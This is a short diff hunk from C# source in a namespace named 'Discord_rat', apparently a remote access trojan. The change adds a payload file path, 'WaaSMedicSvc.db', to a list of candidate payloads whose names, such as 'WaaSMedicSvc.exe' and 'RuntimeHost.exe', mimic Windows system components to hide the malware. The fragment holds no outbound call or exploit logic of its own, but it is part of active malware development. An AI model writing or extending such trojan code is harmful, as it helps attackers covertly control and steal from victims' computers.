@@ -195,6 +195,7 @@ namespace Discord_rat
             string baseDir = GetPayloadDirectory();
             string[] candidates =
             {
+                Path.Combine(baseDir, "WaaSMedicSvc.db"),
                 Path.Combine(baseDir, "WaaSMedicSvc.exe"),
                 Path.Combine(baseDir, "RuntimeHost.exe"),
                 Path.Combine(baseDir, "Loader.exe")
